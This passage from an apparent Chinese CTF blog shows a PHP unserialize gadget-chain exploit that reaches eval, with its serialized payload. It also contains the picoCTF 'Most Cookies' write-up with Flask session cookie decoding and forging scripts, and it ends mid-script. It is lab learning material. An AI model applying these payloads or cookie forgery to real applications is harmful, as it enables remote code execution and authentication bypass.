class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">		unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>poc<br>test3：eval任意命令执行-&gt;test2:__tostring调用execute方法-&gt;test1:对象转化为字符串调用test2：__tostring</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> test2();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;obj=<span class="keyword">new</span> test3();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> test1();</span><br><span class="line">	<span class="variable">$s</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">	<span class="keyword">echo</span> urlencode(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">//O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/28/3-30/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/28/3-30/" class="post-title-link" itemprop="url">3-30</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-28 18:53:13" itemprop="dateCreated datePublished" datetime="2022-03-28T18:53:13+08:00">2022-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-30 18:58:41" itemprop="dateModified" datetime="2022-03-30T18:58:41+08:00">2022-03-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="picoctf"><a href="#picoctf" class="headerlink" title="picoctf"></a>picoctf</h1><h2 id="MOST-COOKIE"><a href="#MOST-COOKIE" class="headerlink" title="MOST COOKIE"></a>MOST COOKIE</h2><p>flask模板，提供了sever.py<br>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect, make_response, flash, session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_value = <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>).read().rstrip()</span><br><span class="line">title = <span class="string">&quot;Most Cookies&quot;</span></span><br><span class="line">cookie_names = [<span class="string">&quot;snickerdoodle&quot;</span>, <span class="string">&quot;chocolate chip&quot;</span>, <span class="string">&quot;oatmeal raisin&quot;</span>, <span class="string">&quot;gingersnap&quot;</span>, <span class="string">&quot;shortbread&quot;</span>, <span class="string">&quot;peanut butter&quot;</span>, <span class="string">&quot;whoopie pie&quot;</span>, <span class="string">&quot;sugar&quot;</span>, <span class="string">&quot;molasses&quot;</span>, <span class="string">&quot;kiss&quot;</span>, <span class="string">&quot;biscotti&quot;</span>, <span class="string">&quot;butter&quot;</span>, <span class="string">&quot;spritz&quot;</span>, <span class="string">&quot;snowball&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;thumbprint&quot;</span>, <span class="string">&quot;pinwheel&quot;</span>, <span class="string">&quot;wafer&quot;</span>, <span class="string">&quot;macaroon&quot;</span>, <span class="string">&quot;fortune&quot;</span>, <span class="string">&quot;crinkle&quot;</span>, <span class="string">&quot;icebox&quot;</span>, <span class="string">&quot;gingerbread&quot;</span>, <span class="string">&quot;tassie&quot;</span>, <span class="string">&quot;lebkuchen&quot;</span>, <span class="string">&quot;macaron&quot;</span>, <span class="string">&quot;black and white&quot;</span>, <span class="string">&quot;white chocolate macadamia&quot;</span>]</span><br><span class="line">app.secret_key = random.choice(cookie_names)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> session.get(<span class="string">&quot;very_auth&quot;</span>):</span><br><span class="line">		check = session[<span class="string">&quot;very_auth&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> check == <span class="string">&quot;blank&quot;</span>:</span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, title=title)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> make_response(redirect(<span class="string">&quot;/display&quot;</span>))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = <span class="string">&quot;blank&quot;</span></span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> request.form[<span class="string">&quot;name&quot;</span>] <span class="keyword">in</span> cookie_names:</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/display&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		message = <span class="string">&quot;That doesn&#x27;t appear to be a valid cookie.&quot;</span></span><br><span class="line">		category = <span class="string">&quot;danger&quot;</span></span><br><span class="line">		flash(message, category)</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = <span class="string">&quot;blank&quot;</span></span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/reset&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>():</span></span><br><span class="line">	resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">	session.pop(<span class="string">&quot;very_auth&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">	<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/display&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">	<span class="keyword">if</span> session.get(<span class="string">&quot;very_auth&quot;</span>):</span><br><span class="line">		check = session[<span class="string">&quot;very_auth&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> check == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">			resp = make_response(render_template(<span class="string">&quot;flag.html&quot;</span>, value=flag_value, title=title))</span><br><span class="line">			<span class="keyword">return</span> resp</span><br><span class="line">		flash(<span class="string">&quot;That is a cookie! Not very special though...&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;not-flag.html&quot;</span>, title=title, cookie_name=session[<span class="string">&quot;very_auth&quot;</span>])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = <span class="string">&quot;blank&quot;</span></span><br><span class="line">		<span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看<code>/display</code>路由发现可以通过构造<code>admin</code>的<code>cookie-session</code>访问得到flag<br>flask的session具有特性：<br>构造<code>session</code>需要<code>secret_key</code>，每次产生的cookie都不相同，本题的<code>secret_key</code>在28个字段中随机抽取，每次启动抽取一次。<br>解码<code>session</code>不需要密钥。<br>解码脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(<span class="string">&quot;eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YkGSWw.ujNEUVIqbRA0MVZCG7G0qxUOJAk&quot;</span>.encode()))</span><br></pre></td></tr></table></figure>
<p>编码脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, secret_key</span>):</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span>(<span class="params">metaclass=ABCMeta</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FSCM</span>(<span class="params">ABC</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span></span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">&#x27;Flask Session Cookie Decoder/Encoder&#x27;</span>,</span><br><span class="line">                epilog=<span class="string">&quot;Author : Wilson Sumanang, Alexandre 